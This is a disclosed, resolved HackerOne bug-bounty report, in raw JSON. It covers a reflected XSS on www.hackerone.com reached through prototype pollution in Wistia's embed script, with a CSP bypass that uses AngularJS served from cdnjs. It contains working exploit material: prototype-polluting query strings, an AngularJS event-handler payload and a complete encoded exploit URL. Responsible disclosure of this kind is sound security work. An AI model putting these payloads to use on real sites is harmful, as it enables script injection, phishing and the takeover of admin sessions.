{"id":986386,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODYzODY=","url":"https://hackerone.com/reports/986386","title":"Reflected XSS on www.hackerone.com via Wistia embed code","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2020-09-20T02:51:49.083Z","submitted_at":"2020-09-20T02:51:49.138Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"vakzz","url":"/vakzz","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-09-24T20:29:13.087Z","bug_reporter_agreed_on_going_public_at":"2020-09-24T20:29:13.005Z","team_member_agreed_on_going_public_at":"2020-09-24T20:10:49.826Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\n\nThe HackerOne marketing site uses [Wistia](https://wistia.com/) to host and embed videos using html snippets similar to the following:\n\n```html\n\u003cscript\n  src=\"https://fast.wistia.com/embed/medias/t306dw04gl.jsonp\"\n  async=\"\"\n\u003e\u003c/script\u003e\n\u003cscript src=\"https://fast.wistia.com/assets/external/E-v1.js\" async=\"\"\u003e\u003c/script\u003e\n\u003cdiv class=\"wistia_embed wistia_async_t306dw04gl videoFoam=true\"\u003e\u003c/div\u003e\n```\n\nThe issue is that the `E-v1.js` script is vulnerable to prototype pollution when setting up the logging, via both the url and the document referrer:\n\n```javascript\ni._initializers.initWLog = function() {\n    var e, t, n, o, a, l, s, d, u, p, c;\n    if (t = i.url.parse(location.href),\n    document.referrer \u0026\u0026 (u = i.url.parse(document.referrer)),\n```\n\nIf the url passed to `i.url.parse` contains a query parameter such as `?__proto__.ggg=1` then it will end up on the Object prototype, for example visiting `https://www.hackerone.com/blog/scaling-security-startup-unicorn?__proto__[ggg]=aaa` and typing `Object.prototype` in the console will show a new property `ggg`.\n\nWhen initializing the embeds the script creates elements using a method `elem.fromObject`, which takes a hash of properties and turns it into a new element:\n\n```javascript\nif (this.chrome = r.elem.fromObject({\n    id: r.seqId('wistia_chrome_'),\n    class: 'w-chrome',\n    style: r.generate.relativeBlockCss(),\n    tabindex: -1\n})\n```\n\nIf we use the prototype pollution to add `innerHTML` to Object, then when it is iterating over the hash keys it will find `innerHTML` and set it on the newly created element.\n\nThis will create an element with our html, and with a few extra parameters to prevent the script from erroring too early, it will also be added to the dom.\n\n### CSP Bypass\n\nThis allows for arbitrary html to be injected, but due to the CSP inline scripts are blocked. The CSP does allow for `*.cloudflare.com` to be used as a script src though, which means that angularJS can be loaded into an iframe with srcdoc and be used to bypass the CSP:\n\n```html\n\u003cscript src=\"//code.angularjs.org/1.8.0/angular.js\"\u003e\u003c/script\u003e\n\u003cdiv ng-app\u003e\n  \u003cimg\n    src=\"/\"\n    ng-on-error=\"$event.srcElement.ownerDocument.defaultView.alert($event.srcElement.ownerDocument.domain)\"\n  /\u003e\n\u003c/div\u003e\n```\n\n### Steps To Reproduce\n\n1. Visit `https://www.hackerone.com/blog/scaling-security-startup-unicorn?__proto__.innerHTML=\u003ciframe%20srcdoc%3d\"\u003cscript%20src%3d%26quot%3bhttps%3a//cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.min.js%26quot%3b\u003e\u003c/script\u003e\u003cbody%20ng-app%20ng-csp\u003e\u003cimg%20src%3d/%20ng-on-error%3d$event.srcElement.ownerDocument.defaultView.parent.document.body.innerHTML%3d$event.srcElement.ownerDocument.defaultView.atob('PHN0eWxlPi5pMXthbmltYXRpb246IHJsIDEuNXMgaW5maW5pdGUgbGluZWFyOyB3aWR0aDogMjgwcHh9Lmkye2FuaW1hdGlvbjogcnIgMS41cyBpbmZpbml0ZSBsaW5lYXI7IHdpZHRoOiAyODBweH1Aa2V5ZnJhbWVzIHJse2Zyb217dHJhbnNmb3JtOiByb3RhdGUoMGRlZyk7fXRve3RyYW5zZm9ybTogcm90YXRlKDM1OWRlZyk7fX1Aa2V5ZnJhbWVzIHJye2Zyb217dHJhbnNmb3JtOiByb3RhdGUoMGRlZyk7fXRve3RyYW5zZm9ybTogcm90YXRlKC0zNTlkZWcpO319PC9zdHlsZT48YSBocmVmPS8vaGFja2Vyb25lLmNvbS9jb3JiM25paz48aW1nIGNsYXNzPWkxIHNyYz0vL2VtYmVkLWZhc3RseS53aXN0aWEuY29tL2RlbGl2ZXJpZXMvYjY3OGIxMTM1ODU4YjZlMzQ3NGEyYjE4ZDU1OGE1ODQ4MTk5MjNlYi5wbmc%2BPC9hPjxhIGhyZWY9Ly9oYWNrZXJvbmUuY29tL3Zha3p6PjxpbWcgY2xhc3M9aTIgc3JjPS8vZW1iZWQtZmFzdGx5Lndpc3RpYS5jb20vZGVsaXZlcmllcy9kYjY5ZjRjMzE5NWYxYTAwNjA1NmM0N2VhZWM5NmQ2YWMyYjM3NTU4LnBuZz48L2E%2BIDxicj5kb2N1bWVudC5kb21haW4gaXM6IA%3D%3D')%2b$event.srcElement.ownerDocument.domain\u003e\u003c/body\u003e\"\u003e\u003c/iframe\u003e{{7*7}}\u0026__proto__.__global__=1\u0026__proto__.t306dw04gl=1\u0026__proto__.__wistia-t306dw04gl-1_dom_options__=1\u0026__proto__.wistia-t306dw04gl-1=1`\n\n## Impact\n\n* Phishing attacks - if you are logged in to https://hackerone.com/ and you visit https://www.hackerone.com/ then you are redirected to your hacker dashboard. As chrome doesn't show the www so the domains look the same.\n* Depending on how Drupal is setup it may be possible to target a logged in admin, eg using the xss to load `/admin/modules/install` and install a malicious plugin","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eThe HackerOne marketing site uses \u003ca href=\"/redirect?url=https%3A%2F%2Fwistia.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eWistia\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to host and embed videos using html snippets similar to the following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script\n  \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://fast.wistia.com/embed/medias/t306dw04gl.jsonp\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"na\"\u003easync=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://fast.wistia.com/assets/external/E-v1.js\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003easync=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;wistia_embed wistia_async_t306dw04gl videoFoam=true\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe issue is that the \u003ccode\u003eE-v1.js\u003c/code\u003e script is vulnerable to prototype pollution when setting up the logging, via both the url and the document referrer:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003e_initializers\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einitWLog\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003et\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003en\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003el\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003es\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eu\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003et\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehref\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereferrer\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eu\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereferrer\u003c/span\u003e\u003cspan class=\"p\"\u003e)),\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf the url passed to \u003ccode\u003ei.url.parse\u003c/code\u003e contains a query parameter such as \u003ccode\u003e?__proto__.ggg=1\u003c/code\u003e then it will end up on the Object prototype, for example visiting \u003ccode\u003ehttps://www.hackerone.com/blog/scaling-security-startup-unicorn?__proto__[ggg]=aaa\u003c/code\u003e and typing \u003ccode\u003eObject.prototype\u003c/code\u003e in the console will show a new property \u003ccode\u003eggg\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eWhen initializing the embeds the script creates elements using a method \u003ccode\u003eelem.fromObject\u003c/code\u003e, which takes a hash of properties and turns it into a new element:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003echrome\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eelem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003efromObject\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eid\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eseqId\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ewistia_chrome_\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eclass\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew-chrome\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003estyle\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egenerate\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erelativeBlockCss\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e\n    \u003cspan class=\"na\"\u003etabindex\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf we use the prototype pollution to add \u003ccode\u003einnerHTML\u003c/code\u003e to Object, then when it is iterating over the hash keys it will find \u003ccode\u003einnerHTML\u003c/code\u003e and set it on the newly created element.\u003c/p\u003e\n\n\u003cp\u003eThis will create an element with our html, and with a few extra parameters to prevent the script from erroring too early, it will also be added to the dom.\u003c/p\u003e\n\n\u003ch3 id=\"csp-bypass\"\u003eCSP Bypass\u003c/h3\u003e\n\n\u003cp\u003eThis allows for arbitrary html to be injected, but due to the CSP inline scripts are blocked. The CSP does allow for \u003ccode\u003e*.cloudflare.com\u003c/code\u003e to be used as a script src though, which means that angularJS can be loaded into an iframe with srcdoc and be used to bypass the CSP:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;//code.angularjs.org/1.8.0/angular.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003eng-app\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e\n    \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eng-on-error=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;$event.srcElement.ownerDocument.defaultView.alert($event.srcElement.ownerDocument.domain)\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps To Reproduce\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eVisit \u003ccode\u003ehttps://www.hackerone.com/blog/scaling-security-startup-unicorn?__proto__.innerHTML=\u0026lt;iframe%20srcdoc%3d\u0026quot;\u0026lt;script%20src%3d%26quot%3bhttps%3a//cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.min.js%26quot%3b\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;body%20ng-app%20ng-csp\u0026gt;\u0026lt;img%20src%3d/%20ng-on-error%3d$event.srcElement.ownerDocument.defaultView.parent.document.body.innerHTML%3d$event.srcElement.ownerDocument.defaultView.atob(\u0026#39;PHN0eWxlPi5pMXthbmltYXRpb246IHJsIDEuNXMgaW5maW5pdGUgbGluZWFyOyB3aWR0aDogMjgwcHh9Lmkye2FuaW1hdGlvbjogcnIgMS41cyBpbmZpbml0ZSBsaW5lYXI7IHdpZHRoOiAyODBweH1Aa2V5ZnJhbWVzIHJse2Zyb217dHJhbnNmb3JtOiByb3RhdGUoMGRlZyk7fXRve3RyYW5zZm9ybTogcm90YXRlKDM1OWRlZyk7fX1Aa2V5ZnJhbWVzIHJye2Zyb217dHJhbnNmb3JtOiByb3RhdGUoMGRlZyk7fXRve3RyYW5zZm9ybTogcm90YXRlKC0zNTlkZWcpO319PC9zdHlsZT48YSBocmVmPS8vaGFja2Vyb25lLmNvbS9jb3JiM25paz48aW1nIGNsYXNzPWkxIHNyYz0vL2VtYmVkLWZhc3RseS53aXN0aWEuY29tL2RlbGl2ZXJpZXMvYjY3OGIxMTM1ODU4YjZlMzQ3NGEyYjE4ZDU1OGE1ODQ4MTk5MjNlYi5wbmc%2BPC9hPjxhIGhyZWY9Ly9oYWNrZXJvbmUuY29tL3Zha3p6PjxpbWcgY2xhc3M9aTIgc3JjPS8vZW1iZWQtZmFzdGx5Lndpc3RpYS5jb20vZGVsaXZlcmllcy9kYjY5ZjRjMzE5NWYxYTAwNjA1NmM0N2VhZWM5NmQ2YWMyYjM3NTU4LnBuZz48L2E%2BIDxicj5kb2N1bWVudC5kb21haW4gaXM6IA%3D%3D\u0026#39;)%2b$event.srcElement.ownerDocument.domain\u0026gt;\u0026lt;/body\u0026gt;\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;{{7*7}}\u0026amp;__proto__.__global__=1\u0026amp;__proto__.t306dw04gl=1\u0026amp;__proto__.__wistia-t306dw04gl-1_dom_options__=1\u0026amp;__proto__.wistia-t306dw04gl-1=1\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003ePhishing attacks - if you are logged in to \u003ca title=\"https://hackerone.com/\" href=\"https://hackerone.com/\"\u003ehttps://hackerone.com/\u003c/a\u003e and you visit \u003ca title=\"https://www.hackerone.com/\" href=\"/redirect?url=https%3A%2F%2Fwww.hackerone.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.hackerone.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e then you are redirected to your hacker dashboard. As chrome doesn\u0026#39;t show the www so the domains look the same.\u003c/li\u003e\n\u003cli\u003eDepending on how Drupal is setup it may be possible to target a logged in admin, eg using the xss to load \u003ccode\u003e/admin/modules/install\u003c/code\u003e and install a malicious plugin\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-10-24T20:10:50.037Z","allow_singular_disclosure_after":-5656043.321604921,"singular_disclosure_allowed":true,"vote_count":211,"voters":["jarij","acut3","xparrot","badf00d","thaivu","yxw21","sourc7","gamer7112","secator","wh0ru","and 201 more..."],"severity":{"rating":"low","score":3.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":6,"asset_type":"URL","asset_identifier":"https://www.hackerone.com","max_severity":"high"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":9267945,"is_internal":false,"editable":false,"type":"Activities::ReportCollaboratorInvited","message":null,"markdown_message":"","automated_response":false,"created_at":"2020-09-20T02:52:26.334Z","updated_at":"2020-09-20T02:52:26.334Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"email":"corb3nik","genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9268015,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"{F994868}","markdown_message":"\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"hackerone.gif\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gGjPbcKiRnsg7isoXhWbVHbu?response-content-disposition=attachment%3B%20filename%3D%22hackerone.gif%22%3B%20filename%2A%3DUTF-8%27%27hackerone.gif\u0026amp;response-content-type=image%2Fgif\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUIB4UHNM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071813Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCxIrj1doJNRgPl0K9hS5p6f7Tw0ZCLxkR3Tow%2FyKAUywIgCWjTM%2B0MIHMBZ2imZkb4IzrAjagqoPfY1Jv5eTsZNXgqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLMTbQx26P2FczjSiyqRA%2FLPPp2oskzA0CfrdSUEMOlMvP48BEyVmuBCHzMHL1enXiFYCfOobepv6PEAMMeqbAh54%2B2%2F665l%2BMJKVPRWgDDDDFNErFPUSo3zrxmGMsfp3ydxzz3PH%2Bfz56AAEkhaRf3CDGMe9Ga%2F3sQhwsNKk%2BWRbSxPjyYj9kp0HLCN0LSRdWYY2u9s9zQUbMDwo0MARzdntum%2BwmYGP0HZ4wF7TAG4PadX5fZZLNq75k6dp7JuiSQgm%2BBCm08N2PPj5%2FA2Ibkj2p8IS%2FdqMrv6eGwDRBM4jnNHbuhpYfhiBf2hqHoA4ve8DvyEEjjysfdvhM9uyBDiEBkPUaTb5%2FRb5KoDN6kwoSap1GrI9FNFBwwPLRcFVdbpaUyhUYP4%2BQCBBKC0pmx3lY0nJOdl5CCJoQPkWx7PShTJyM3xaAkIqPuNVNctFUCX%2BdUSMgTV0e%2FX%2Fb4YFTr%2BRaGrekVG4XUAU1KvpMz5xtQobvDDjUlkz6RgQdKF%2BsoAj%2FoAaE32eX5nfk%2BbcwnPZneLkQv2oDvQ7xIKq%2BAIMLSjq%2F8FOusB86dSG6YigMM%2B4aJ4fSacVAzfpXK4ZEQh8HWeRY6qSeFWr5lwPKvQ0iBOrP8%2FwWCCdfICp3rmg9sSKwaSFXovUcDOizwrg0UsIEOtZtzLbX0SX3qA8bsmsLQd8uZ0TnhRbUfjzNKWZWR1norGGjkaRvLgO49zv%2FDoBEmBW0LfRd9AIw1LRyLc6S%2BYAOnQQTzCAVD2bf4H94W0Bleosp5xxA6yu5quq8eNM0dkMvid0%2Bz06Lp5p6kOBLlnhY2JGv94mdqrGgeLHphVreAmW2qxUltNYxjsF3u0LHWxiwbIkzNwDFxJoIjwt8GIOQ%3D%3D\u0026amp;X-Amz-Signature=667b99f9043282a9dabbdd50fcd95717b4d4feab4e58ab58a4a4de99ad503f16\" data-attachment-type=\"image/gif\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gGjPbcKiRnsg7isoXhWbVHbu?response-content-disposition=attachment%3B%20filename%3D%22hackerone.gif%22%3B%20filename%2A%3DUTF-8%27%27hackerone.gif\u0026amp;response-content-type=image%2Fgif\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQUIB4UHNM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071813Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCxIrj1doJNRgPl0K9hS5p6f7Tw0ZCLxkR3Tow%2FyKAUywIgCWjTM%2B0MIHMBZ2imZkb4IzrAjagqoPfY1Jv5eTsZNXgqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLMTbQx26P2FczjSiyqRA%2FLPPp2oskzA0CfrdSUEMOlMvP48BEyVmuBCHzMHL1enXiFYCfOobepv6PEAMMeqbAh54%2B2%2F665l%2BMJKVPRWgDDDDFNErFPUSo3zrxmGMsfp3ydxzz3PH%2Bfz56AAEkhaRf3CDGMe9Ga%2F3sQhwsNKk%2BWRbSxPjyYj9kp0HLCN0LSRdWYY2u9s9zQUbMDwo0MARzdntum%2BwmYGP0HZ4wF7TAG4PadX5fZZLNq75k6dp7JuiSQgm%2BBCm08N2PPj5%2FA2Ibkj2p8IS%2FdqMrv6eGwDRBM4jnNHbuhpYfhiBf2hqHoA4ve8DvyEEjjysfdvhM9uyBDiEBkPUaTb5%2FRb5KoDN6kwoSap1GrI9FNFBwwPLRcFVdbpaUyhUYP4%2BQCBBKC0pmx3lY0nJOdl5CCJoQPkWx7PShTJyM3xaAkIqPuNVNctFUCX%2BdUSMgTV0e%2FX%2Fb4YFTr%2BRaGrekVG4XUAU1KvpMz5xtQobvDDjUlkz6RgQdKF%2BsoAj%2FoAaE32eX5nfk%2BbcwnPZneLkQv2oDvQ7xIKq%2BAIMLSjq%2F8FOusB86dSG6YigMM%2B4aJ4fSacVAzfpXK4ZEQh8HWeRY6qSeFWr5lwPKvQ0iBOrP8%2FwWCCdfICp3rmg9sSKwaSFXovUcDOizwrg0UsIEOtZtzLbX0SX3qA8bsmsLQd8uZ0TnhRbUfjzNKWZWR1norGGjkaRvLgO49zv%2FDoBEmBW0LfRd9AIw1LRyLc6S%2BYAOnQQTzCAVD2bf4H94W0Bleosp5xxA6yu5quq8eNM0dkMvid0%2Bz06Lp5p6kOBLlnhY2JGv94mdqrGgeLHphVreAmW2qxUltNYxjsF3u0LHWxiwbIkzNwDFxJoIjwt8GIOQ%3D%3D\u0026amp;X-Amz-Signature=667b99f9043282a9dabbdd50fcd95717b4d4feab4e58ab58a4a4de99ad503f16\" class=\"markdown-inline-image\" style=\"display: 